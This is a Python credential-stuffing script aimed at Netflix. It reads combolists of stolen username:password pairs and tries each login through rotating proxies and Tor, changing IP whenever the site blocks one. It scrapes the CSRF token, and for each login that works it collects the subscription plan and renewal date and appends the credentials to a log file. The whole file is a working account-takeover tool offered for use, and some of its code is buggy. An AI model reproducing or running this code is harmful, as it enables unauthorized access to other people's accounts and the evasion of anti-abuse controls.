#!/usr/bin/python
# -*- coding: utf-8 -*-
"""checker.py: A script for automatize the procedure of checking accounts

Requirements:
    pip install bs4
    pip install schedule #opt
"""

from stem import Signal  # to control tor server
from stem.control import Controller
import time
#import schedule
import datetime
import sys
import requests
from bs4 import BeautifulSoup  # A wonderful module for HTML parsing
# import json

def hilite(string, status=False, bold=False):
    """If tty highligth the output (red/green color)."""

    if not sys.stdout.isatty():
        return string
    attr = []
    if status:
        attr.append('32')  # Green
    else:
        attr.append('31')  # Red
    if bold:
        attr.append('1')
    return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)

def check_not_banned_ip(htmlresponse_text, session_config):
    global s
    soup = BeautifulSoup(htmlresponse_text)
    #TODO use session_config to pass blockipstring{} for login form etc
    suc_selector = soup.select("div.login-content.login-form")
    block_ip_string = 'tecniche e stiamo lavorando per risolverle'
    suc_selector2 = soup.select("div[class=errorBox]")
    block_ip_string2 = "We were unable to process your request."
    if (len(suc_selector) > 0 and block_ip_string in str(suc_selector[0])) or (len(suc_selector2) > 0 and block_ip_string2 in str(suc_selector2[0])):
        # Change proxy
        proxies = session_config['config']['proxy'].pop()
        print(hilite("Waiting for change ip (too many attempt), new proxy:" + str(proxies.get("https")) + "\n"))
        s.proxies.update(proxies)   
        time.sleep(3)  # lets wait to tor! a little!
        return False
    return True

def load_config(current_session):
    # Get login data from file
    current_session['start'] = datetime.datetime.now()  # set the start time
    current_session['config'] = {}
    current_session['config']['proxy'] = []
    current_session['config']['others'] = []
    current_session['config']['timeout'] = 10
    #TODO fopen check
    f_proxy = open("proxy.txt", 'r')
    #delimiter = input("Delimiter char used in combos?[,|:;]")
    for line in f_proxy.readlines():
        ip, port = line.rstrip().split(":", 1)
        port = port.split(' ', 1)[-1]  # Remove all after first space ip:port -somecommentuknow
        proxy = {'https': 'https://'+ip+":"+port,
                'http': 'https://'+ip+":"+port
                }
        # Add also socks4/5 to autocheck
        current_session["config"]["proxy"].append(proxy)
    return current_session
    

def try_login(username, password, session_config, proxy):

    url_0 = 'https://www.netflix.com/it/login'
    #url_0 = 'https://www.netflix.com/'
    #url_0 = 'https://www.atagar.com/echo.php'
    # Start a new session, to preserve the cookie
    global s
    s = requests.session()
    s.proxies = proxy
    timeout = session_config['config']['timeout']
    # Take session and anti-csrf Token
    first_request_header = {
        # Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'DNT': '1',
        'Origin': 'https://www.netflix.com',
        'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Safari/604.1.38",
        'Accept-Language': 'it-IT'
        }
    t = s.get(url_0, timeout=timeout, headers=first_request_header)
    #print(t.text[6000:9000])
    # Need to check if ip is blocked HERE
    while not check_not_banned_ip(t.text, session_config):
        t = s.get(url_0, timeout=session_config['config']['timeout'])
        # Change ip until one is working
    soup = BeautifulSoup(t.text)
    # <input type="hidden" name="authURL" value="1512662844016.x/YbP+x4YT46gEs4cfzv0ysbeUU=" data-reactid="54"/>
    auth_url = soup.find("input", {"name": "authURL"})['value']
    # The login POST payload
    login_payload = {
        'email': username,
        'password': password,
        'rememberMe': 'true',
        # flow=websiteSignUp&mode=login&action=loginAction&withFields=email%2Cpassword%2CrememberMe%2CnextPage%2CshowPassword&authURL=1512662195897.lSoDYxqHH2imMWk0TietV5jgoII%3D&nextPage=&showPassword='
        'flow': 'websiteSignUp',
        'mode': 'login',
        'action': 'loginAction',
        'withFields': 'email,password,rememberMe,nextPage,showPassword',
        'authURL': auth_url,
        'nextPage': None,
        'showPassword': None
    }
    login_headers = {
        # Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'DNT': '1',
        'Origin': 'https://www.netflix.com',
        'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Safari/604.1.38",
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Referer': url_0
    }
    try:
        l_response = s.post(url_0, data=login_payload, headers=login_headers)
        # vote_response = s.post(url, data=vote_payload, headers=vote_headers)
        if l_response and l_response.status_code == 200:
            # print hilite("Error:", False, True)  # Bold
            soup = BeautifulSoup(l_response.text)
            suc_selector = soup.select("div.login-content.login-form")
            block_ip_string = 'tecniche e stiamo lavorando per risolverle'
            suc_selector2 = soup.select("div[class=login-form]")
            #suc_selector2 = soup.select("div.error-box")
            block_ip_string2 = "We were unable to process your request."
            if len(suc_selector) > 0 and block_ip_string in str(suc_selector[0]) or len(suc_selector2) > 0 and block_ip_string2 in str(suc_selector2[0]):
                # Ip blocked, need change ip tor, proxylist, vpn
                print(hilite("Waiting for change ip, TOR.\n"))
                #session_config['tor_controller'].signal(Signal.NEWNYM) # signal tor to change ip 
                time.sleep(3)  # lets wait to tor! a little!
            if len(suc_selector) > 0 and ('Please try again' in str(suc_selector[0]) or 'Incorrect' in str(suc_selector[0])):
                print("Account " + username + ":" + password + " is not working!")
                #print(l_response.text[:5640])
            else:
                # Check acccount info (2 urls for netflix, billing contains all needed infos)!
                account_url = "https://www.netflix.com/youraccount"
                account_url = "https://www.netflix.com/BillingActivity"
                #<strong data-reactid="141">4 Screens + </strong>
                l_response = s.get(account_url)
                soup = BeautifulSoup(l_response.text)
                # Cerco per il campo abbonamento vedi html sopra
                plan_selector = soup.findAll("span", {"data-reactid": "84"})
                renewal_date_selector = soup.findAll("div", {"data-reactid": "90"})
                working_condition_selector = soup.findAll("button", {"tabindex": "0"})
                # Uncomment for debugging or updating config pourpose
                #print(l_response.text[6000:16000])
                # Check info about billings, plans, expired or not?
                if len(plan_selector) > 0:
                    print(plan_selector)
                    print(len(plan_selector))
                    plan = plan_selector[0].getText()
                    renewal_date = renewal_date_selector[0].getText()
                    print(hilite("Account " + username + " have " + plan, True))
                    if len(working_condition_selector) > 0 and "Update Payment" in working_condition_selector[0].getText():
                        print(hilite("Expired (next renewal)" + renewal_date))
                    else:
                        print(hilite(" valid until: " + renewal_date), True)
                    #print(l_response.text[:5640])
                    fw = "log.txt"
                    with open(fw, "a+") as log:
                        log.write(username+":"+password+"|" + renewal_date + "|" + plan +"\n")
                else:
                    #Some other pages appeared (different nation proxy etc
                    print(hilite("! Login failed for " + username))
                    print("No parsed info (needed updated config??)\n")
                    pass

    except Exception as e:
        print(hilite("! Login failed for " + username))
        #print(l_response.text[:5640])
        print(e)
        #raise(e)


def main():
    # Get login data from file
    current_session = {} 
    current_session['start'] = datetime.datetime.now()  # set the start time
    # Tor configuration
    
    current_session['config'] = {}
    current_session['config']['control'] = {}
    current_session['config']['tor'] = {
    "server" : "127.0.0.1",
    "port" : "9050",
    "protocol" : "socks5",
    "control" : {
          "password" : "",
          "port" : "9051"
          }
    }

    current_session = {} 
    current_session = load_config(current_session)
    current_session["config"]["changeProxyFlag"] = True
    #First time need to update proxy
    try:
        # Some configuration infos
        fname = input("Combolist file name?")
        f = open(fname, 'r')
        delimiter = input("Delimiter char used in combos?[,|:;]")
        line_index = 0
        combo_list = f.readlines()
        proxy = current_session["config"]["proxy"].pop()
        while line_index < len(combo_list):
            line = combo_list[line_index]
            #print("Read from file:" + line)
            if not line or line.startswith("#") or len(line) < 4:  # line is blank or a comment
                continue
                line_index += 1
            print(line)
            user, password = line.rstrip().split(delimiter, maxsplit=1)
            try:
                try_login(user, password, current_session, proxy)
                print(line_index)
                line_index += 1
            except requests.exceptions.RequestException:
                # Proxy KO
                # Change proxy next iteration 
                #current_session["config"]["changeProxyFlag"] = True
                proxy = current_session["config"]["proxy"].pop()
                print(hilite("Waiting for ip refresh (proxy not working). New proxy" +str(proxy) + "\n"))
                continue

        print ("End of cracking:", str(datetime.date.today()))
    except ValueError:
        print(hilite("Check the format of your accounts.txt! It should be like:\nusername:password<cr>"))
        print("The script will try to go on in case of:\na)A blank line\nb)a comment (#) line\nPress CTRL+C to exit")
    except KeyboardInterrupt:
        print(hilite("[Closing the resource, shutdown the network module... WAIT]"))
    except Exception as e:
        print(hilite("Unhelded exception, exiting.." + str(e)))


def main2():
    # Get login data from file
    f = file("accounts.txt", 'r')
    f2 = file("pswd.txt", 'r')
    for line in f.readlines():
        user, password = line.rstrip().split(":")
        for line in f2.readlines():
            try_login(user, line.strip())

main()
#schedule.every().day.at("03:00").do(main)
# schedule.every(1).minute.do(main)
while True:
    schedule.run_pending()
    time.sleep(20)  # Wait one minute
